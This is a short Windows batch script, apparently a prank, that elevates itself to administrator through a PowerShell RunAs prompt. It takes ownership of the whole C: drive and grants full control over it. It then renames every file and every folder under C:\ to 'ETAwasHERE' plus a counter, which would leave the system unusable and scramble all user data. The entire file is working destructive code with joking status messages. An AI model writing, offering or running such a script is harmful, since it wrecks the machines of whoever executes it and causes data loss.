@echo off
setlocal enabledelayedexpansion

set "target=C:\"
set "basename=ETAwasHERE"

:: --- elevate if not admin ---
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo getting ze adminz
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

echo takeowning lmao
takeown /f "%target%" /r /d y >nul 2>&1
icacls "%target%" /grant Administrators:F /t /c >nul 2>&1

set /a count=0
echo.
echo doing the funnies

for /r "%target%" %%F in (*) do (
    set /a count+=1
    set "ext=%%~xF"
    set "newname=%basename%_!count!!ext!"
    ren "%%F" "!newname!" 2>nul
)

echo.
echo doing the funnies again

for /f "delims=" %%D in ('dir "%target%" /ad /b /s ^| sort /R') do (
    set /a count+=1
    set "parent=%%~dpD"
    set "newname=%basename%_!count!"
    ren "%%D" "!newname!" 2>nul
)

echo.
echo finished files effected: !count!
pause
